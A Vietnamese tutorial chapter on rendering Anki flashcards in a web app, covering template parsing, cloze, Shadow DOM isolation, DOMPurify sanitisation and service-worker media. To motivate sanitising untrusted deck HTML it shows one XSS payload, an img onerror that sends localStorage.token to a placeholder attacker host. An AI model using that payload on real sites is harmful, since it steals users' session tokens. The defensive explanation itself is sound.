# 4. Render thẻ

## Lỗi làm lộ ra cả một tầng bị thiếu

Báo cáo từ người dùng: *"thẻ trước nó hiện mỗi số, nhấn hiện sau mới ra tất cả
thông tin"*.

Phản xạ sai: đoán "chắc import thiếu dữ liệu". Cách đúng: **đọc template thật của
bộ thẻ** — vì bộ đó là schema v11 nên `qfmt`/`afmt` đã nằm sẵn trong IndexedDB.

```
--- [0] "Recognition" QFMT ---
<span style="font-size: 100px;">{{Kanji}}</span>

--- [1] "Recall" QFMT ---
<span style="font-size: 25px;">{{English}}</span>
```

Ra ngay hai chuyện:

| | Mặt trước thật | App hiện |
| --- | --- | --- |
| `Recognition` (ord 0) | `{{Kanji}}` → 一 | 一 ✓ |
| `Recall` (ord 1) | `{{English}}` → "one" | **一** ✗ |

App luôn lấy `fields[0]`, **bỏ qua `card.ord`**. Và vì bộ thẻ xếp theo tần suất nên
vài thẻ đầu là 一 二 三 — kanji của số 1, 2, 3. Nhìn đúng là "hiện mỗi số" thật.

> **Cách nghĩ**: khi người dùng báo lỗi, đừng sửa theo mô tả của họ. Tìm cho ra
> *dữ liệu thật* rồi so với *hành vi thật*. Ở đây mô tả là "import hạn chế", còn
> nguyên nhân thật là tầng render quên một trường.

## `ord` là cầu nối giữa note và card

Nhắc lại từ [bài 01](01-tu-y-tuong-den-kien-truc.md): một note sinh nhiều card qua
nhiều template, `ord` trỏ index template.

```ts
const template = notetype?.templates[card.ord] ?? notetype?.templates[0]
```

Một dòng. Nhưng nếu schema đã rút gọn thành bảng `cards` phẳng thì không có chỗ nào
để viết dòng này. **Quyết định schema ở bài 01 là thứ làm cho bản sửa này chỉ tốn
một dòng thay vì một cuộc đại phẫu.**

## Viết template engine

Cú pháp Anki tối thiểu cần hỗ trợ:

| Cú pháp | Ý nghĩa |
| ------- | ------- |
| `{{Field}}` | thay bằng nội dung field |
| `{{FrontSide}}` | chèn lại toàn bộ mặt trước vào mặt sau |
| `{{#Field}}…{{/Field}}` | chỉ hiện nếu field **không** rỗng |
| `{{^Field}}…{{/Field}}` | chỉ hiện nếu field rỗng |
| `{{cloze:Text}}` | thẻ điền khuyết |
| `{{hint:Field}}` | nội dung ẩn, bấm mới hiện |
| `{{type:Field}}` | ô gõ đáp án rồi so sánh |
| `{{furigana:Field}}` | ruby text cho `漢字[かんじ]` |

### Vì sao phải parse thành cây, không thay bằng regex

Cám dỗ: `html.replace(/\{\{(\w+)\}\}/g, …)`. Đủ dùng cho `{{Field}}` nhưng chết ngay
với section lồng nhau:

```
{{#Kanji}}A{{#Onyomi}}B{{/Onyomi}}C{{/Kanji}}
```

Regex không biết `{{/Onyomi}}` đóng cái nào. Phải parse thật, dùng một ngăn xếp:

```ts
if (inner.startsWith('#') || inner.startsWith('^')) {
  stack.push({ name: …, negate: inner[0] === '^', children: [] })
} else if (inner.startsWith('/')) {
  const section = stack.pop()
  // pop TRƯỚC rồi mới push: current() lúc này đã là cấp cha
  if (section) current().push({ kind: 'section', … })
}
```

Chi tiết dễ sai: thứ tự `pop` và `push`. Hàm `current()` đọc đỉnh ngăn xếp, nên phải
`pop` xong mới `push` — không thì section tự nhét vào chính nó.

### Bộ lọc áp từ phải sang trái

```
{{text:furigana:Kanji}}  =  text( furigana( Kanji ) )
```

Bộ lọc gần tên field nhất chạy trước:

```ts
const parts = expr.split(':')
const name = parts.pop()!.trim()
const filters = parts.map((f) => f.trim())

let value = rawField(name, data)
for (let i = filters.length - 1; i >= 0; i--) {
  value = applyFilter(filters[i], value, name, data)
}
```

### Bộ lọc lạ phải trả rỗng, không được ném lỗi

Bộ thẻ ngoài đời dùng đủ thứ: `{{tts ja_JP:Kanji}}`, `{{voice:…}}`. Nếu gặp bộ lọc
lạ mà ném exception thì **cả thẻ trắng xoá**.

```ts
if (filter.startsWith('tts') || filter === 'voice') return ''
// Bộ lọc lạ: bỏ qua, không làm vỡ thẻ.
return value
```

> **Nguyên tắc**: parser cho dữ liệu người lạ phải **chịu lỗi**, không phải nghiêm
> khắc. Bạn không kiểm soát đầu vào, và một thẻ hơi sai vẫn hơn một màn hình trắng.

### Cloze phụ thuộc `ord`

```
Thủ đô là {{c1::Hà Nội}}, có {{c2::Hồ Gươm}}
```

Note này sinh 2 thẻ. Thẻ `ord 0` che `c1`, thẻ `ord 1` che `c2`. Cloze **không phải
đang xét thì hiện bình thường** — người học cần ngữ cảnh.

```ts
const active = data.ord + 1
if (index !== active) return text              // cloze khác: hiện nguyên
if (data.side === 'front') return '[…]'        // đang xét, mặt trước: che
return `<span class="cloze">${text}</span>`    // đang xét, mặt sau: lộ
```

## Shadow DOM, không phải iframe

CSS của notetype là **CSS của người lạ**. Bộ thẻ tải về có thể chứa:

```css
body { background: black; }
div  { font-size: 100px; }
```

Nhét thẳng vào trang là vỡ toàn bộ app. Hai cách cô lập:

| | iframe | Shadow DOM |
| --- | --- | --- |
| Cô lập CSS | ✓ | ✓ |
| Đo chiều cao | **khổ** — phải đo nội dung rồi chỉnh `height` bằng JS | tự nhiên, là phần tử bình thường |
| Chia sẻ event | phải `postMessage` | bubble lên như thường |

Chọn Shadow DOM.

```tsx
const root = host.shadowRoot ?? host.attachShadow({ mode: 'open' })
root.replaceChildren()

const style = document.createElement('style')
style.textContent = `${BASE_CSS}\n${css}`     // BASE_CSS trước để notetype ghi đè được
root.appendChild(style)

const card = document.createElement('div')
card.className = 'card'                        // CSS của Anki nhắm vào .card
card.innerHTML = sanitizeCardHtml(html)
root.appendChild(card)
```

Thứ tự `BASE_CSS` rồi mới tới `css` của notetype là cố ý: base cho mặc định hợp lý
(`img { max-width: 100% }`), notetype vẫn ghi đè được nếu muốn.

### Mẹo hay: chặn sự kiện ngay trong shadow root

Màn ôn lật thẻ khi bấm vào vùng thẻ. Nhưng bấm vào ô gõ đáp án hay nút phát audio
thì **không được lật**.

Khó ở chỗ: sự kiện từ Shadow DOM bị *retarget* — listener bên ngoài chỉ thấy phần
tử host, không thấy `<input>` thật. Không phân biệt được.

Giải: đặt listener **bên trong** shadow root, ở đó thấy target thật:

```ts
if (target.closest?.('input, textarea, audio, video, button, a')) {
  event.stopPropagation()
}
```

Listener trong shadow root chạy trước, chặn ở đó là bên ngoài không nhận được.

### Phím tắt và ô nhập

Phím `Space` để lật thẻ. Nhưng đang gõ trong ô `{{type:}}` thì `Space` phải là dấu
cách. Vẫn vướng chuyện retarget: `document.activeElement` chỉ trả về host.

Phải lần xuống qua từng shadow root:

```ts
export function isTypingTarget(): boolean {
  let element: Element | null = document.activeElement
  while (element) {
    if (element instanceof HTMLInputElement) return true
    const inner = (element as HTMLElement).shadowRoot?.activeElement ?? null
    if (inner === element) return false      // chặn vòng lặp vô hạn
    element = inner
  }
  return false
}
```

## Sanitize: không phải tuỳ chọn

**HTML trong bộ thẻ tải về là code của người lạ.** Bộ thẻ từ diễn đàn có thể chứa:

```html
<img src=x onerror="fetch('https://kẻ-xấu/'+localStorage.token)">
```

Shadow DOM cô lập CSS, **không cô lập JavaScript**. Script trong shadow root chạy
với đầy đủ quyền của trang.

```ts
export function sanitizeCardHtml(html: string): string {
  return DOMPurify.sanitize(html, CONFIG)
}
```

Nhưng config phải **mở đúng chỗ** — mặc định DOMPurify cắt mất thứ thẻ Anki cần:

```ts
const CONFIG = {
  ADD_TAGS: ['ruby', 'rt', 'rb', 'rp', 'audio', 'video', 'source'],
  ADD_ATTR: ['controls', 'preload', 'autocapitalize', …],
}
```

Không có `ruby`/`rt` thì furigana mất. Không có `controls` thì nút phát audio biến mất.

> **Bẫy nguy hiểm nhất của cả dự án nằm ở đây**: `DOMPurify` chỉ tự kích hoạt khi
> có `window`. Chạy dưới Node nó **im lặng trở thành hàm rỗng** — test sanitize vẫn
> báo "đạt" mà chẳng kiểm tra gì. Phải cấp `jsdom` trước khi nạp code app. Xem
> [bài 07](07-cach-lam-viec.md).

## Media: để service worker lo

Thẻ gốc viết `<img src="neko.jpg">`. File đó nằm trong IndexedDB chứ không có trên
server.

Cách ngây thơ: `URL.createObjectURL(blob)` rồi thay `src`. Vấn đề là **vòng đời** —
phải `revokeObjectURL` đúng lúc, không thì rò bộ nhớ; revoke sớm thì ảnh vỡ.

Cách đã chọn: đổi đường dẫn thành `/media/neko.jpg`, để service worker chặn và trả
blob.

```ts
return `${prefix}${quote}/media/${encodeURIComponent(url)}${quote}`
```

Thẻ không cần biết gì về IndexedDB. Không có vòng đời nào phải quản lý. Chi tiết
phía service worker ở [bài 06](06-deploy-va-pwa.md).

`[sound:x.mp3]` — cú pháp riêng của Anki, không phải HTML — đổi thành thẻ `<audio>`:

```ts
html.replace(/\[sound:([^\]]+)\]/g, (_a, name) =>
  `<audio class="anki-sound" controls preload="none" src="/media/${encodeURIComponent(name)}"></audio>`)
```

## Luôn có đường lùi

Gói schema v18 không đọc được `qfmt`/`afmt`. Không được để màn hình trắng:

```ts
if (!notetype || !template || template.qfmt.trim() === '') {
  return { ...rawFallback(note, notetype), templated: false, … }
}

// Template nào ra mặt trước rỗng thì thẻ vô dụng — thà hiện thô còn hơn hiện trắng.
if (isBlank(front)) {
  return { ...rawFallback(note, notetype), templated: false, … }
}
```

Dạng thô: field đầu là mặt trước, các field còn lại kèm nhãn là mặt sau. Xấu nhưng
**học được**. Kèm một dòng nhắc người dùng export lại với *"Support older Anki
versions"*.

> **Nguyên tắc**: mọi tầng xử lý dữ liệu ngoài tầm kiểm soát đều cần một đường lùi
> **vẫn dùng được**, không phải một thông báo lỗi.

## Đọc tiếp

- [05 — Giao diện cho điện thoại](05-giao-dien-mobile.md)
- Code: [`src/lib/template/render.ts`](../../src/lib/template/render.ts), [`src/features/review/CardView.tsx`](../../src/features/review/CardView.tsx)
